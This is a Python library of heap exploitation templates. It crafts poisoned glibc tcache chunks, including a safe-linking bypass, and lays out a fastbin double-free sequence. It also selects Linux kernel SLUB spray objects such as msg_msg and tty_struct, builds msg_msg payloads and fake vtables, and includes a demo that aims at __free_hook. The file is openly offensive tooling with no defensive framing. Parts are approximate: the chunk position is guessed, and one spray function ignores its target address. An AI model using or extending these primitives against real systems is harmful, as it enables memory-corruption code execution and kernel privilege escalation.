#!/usr/bin/env python3
"""xdev heap spray templates — common heap exploitation primitives."""
import struct
import os


class HeapSpray:
    """Base heap spray with architecture-aware packing."""

    def __init__(self, arch="x86_64"):
        self.arch = arch
        self.word_size = 8 if arch in ("x86_64", "arm64") else 4
        self.pack_fmt = "<Q" if self.word_size == 8 else "<I"

    def p(self, val):
        return struct.pack(self.pack_fmt, val & ((1 << self.word_size * 8) - 1))


class TcachePoison(HeapSpray):
    """glibc tcache poisoning (2.26-2.31, pre-safe-linking)."""

    def craft_chunk(self, target_addr, size=0x40):
        """Craft freed tcache chunk with fd pointing to target."""
        chunk = b""
        chunk += self.p(0)             # prev_size
        chunk += self.p(size | 1)      # size + PREV_INUSE
        chunk += self.p(target_addr)   # fd -> target (next alloc lands here)
        chunk += self.p(0)             # bk (unused in tcache)
        chunk += b"\x00" * (size - len(chunk) - self.word_size * 2)
        return chunk

    def craft_chunk_safe_linking(self, target_addr, heap_base, size=0x40):
        """Craft chunk with safe-linking bypass (glibc 2.32+)."""
        # PROTECT_PTR: (pos >> 12) ^ ptr
        pos = heap_base + 0x10  # approximate chunk user-data position
        mangled = (pos >> 12) ^ target_addr
        chunk = b""
        chunk += self.p(0)
        chunk += self.p(size | 1)
        chunk += self.p(mangled)       # mangled fd
        chunk += self.p(0)
        chunk += b"\x00" * (size - len(chunk) - self.word_size * 2)
        return chunk


class FastbinDup(HeapSpray):
    """glibc fastbin double-free (pre-2.26 or when tcache full)."""

    def alloc_sequence(self, target_addr, chunk_size=0x40):
        """
        Returns (description, fake_chunk_bytes).
        Caller must implement: alloc A, alloc B, free A, free B, free A,
        then alloc with fd=target, alloc, alloc -> lands on target.
        """
        fake_chunk = b""
        fake_chunk += self.p(0)              # prev_size
        fake_chunk += self.p(chunk_size)     # size (must match bin)
        fake_chunk += b"\x00" * (chunk_size - self.word_size * 2)

        desc = (
            f"1. alloc A (size={chunk_size})\n"
            f"2. alloc B (size={chunk_size})\n"
            f"3. free(A), free(B), free(A)  [A->B->A]\n"
            f"4. alloc C = write fd={target_addr:#x}\n"
            f"5. alloc D (gets B)\n"
            f"6. alloc E -> lands at {target_addr:#x}\n"
            f"Place fake chunk at target before step 6."
        )
        return desc, fake_chunk


class KernelSpray(HeapSpray):
    """Linux kernel SLUB cross-cache spray primitives."""

    # Object sizes for common spray targets
    SPRAY_OBJECTS = {
        "msg_msg": {"size": 64, "kmalloc": "kmalloc-64", "syscall": "msgsnd"},
        "pipe_buffer": {"size": 1024, "kmalloc": "kmalloc-1k", "syscall": "pipe+splice"},
        "sk_buff": {"size": 256, "kmalloc": "kmalloc-256", "syscall": "socket+sendmsg"},
        "seq_operations": {"size": 32, "kmalloc": "kmalloc-32", "syscall": "open(/proc/self/stat)"},
        "tty_struct": {"size": 696, "kmalloc": "kmalloc-1k", "syscall": "open(/dev/ptmx)"},
    }

    def select_spray_object(self, target_size):
        """Find best spray object for a given vulnerable object size."""
        candidates = []
        for name, info in self.SPRAY_OBJECTS.items():
            if info["size"] >= target_size:
                candidates.append((name, info))
        candidates.sort(key=lambda x: x[1]["size"])
        return candidates[0] if candidates else None

    def craft_msg_msg(self, payload, m_type=1):
        """Craft msg_msg structure for kernel heap spray."""
        # struct msg_msg { list_head, long m_type, size_t m_ts, *next, *security }
        msg = b""
        msg += self.p(0) + self.p(0)   # list_head (next, prev)
        msg += self.p(m_type)           # m_type
        msg += self.p(len(payload))     # m_ts
        msg += self.p(0)               # next segment
        msg += self.p(0)               # security
        msg += payload
        return msg


class UAFExploit(HeapSpray):
    """Generic UAF exploitation helpers."""

    def spray_pattern(self, target_addr, spray_size, fill_byte=b"B"):
        """Create spray payload that overwrites vtable/func ptr at known offset."""
        payload = fill_byte * spray_size
        return payload

    def fake_vtable(self, entries, pad_to=0x100):
        """Build a fake vtable with controlled function pointers."""
        vtable = b""
        for addr in entries:
            vtable += self.p(addr)
        vtable += b"\x00" * (pad_to - len(vtable))
        return vtable


def demo():
    """Show usage examples."""
    print("=== Tcache Poison (glibc 2.26-2.31) ===")
    tc = TcachePoison("x86_64")
    chunk = tc.craft_chunk(target_addr=0x404060, size=0x40)
    print(f"  Chunk size: {len(chunk)} bytes")
    print(f"  fd points to: 0x404060 (__free_hook)")

    print("\n=== Safe-Linking Bypass (glibc 2.32+) ===")
    chunk = tc.craft_chunk_safe_linking(0x404060, heap_base=0x55555555a000)
    print(f"  Mangled fd in chunk: {chunk[16:24].hex()}")

    print("\n=== Kernel Spray Object Selection ===")
    ks = KernelSpray("x86_64")
    obj = ks.select_spray_object(target_size=192)
    if obj:
        print(f"  Best match: {obj[0]} (size={obj[1]['size']}, via {obj[1]['syscall']})")

    print("\n=== Fastbin Dup Sequence ===")
    fb = FastbinDup("x86_64")
    desc, fake = fb.alloc_sequence(target_addr=0x602000)
    print(desc)


if __name__ == "__main__":
    demo()
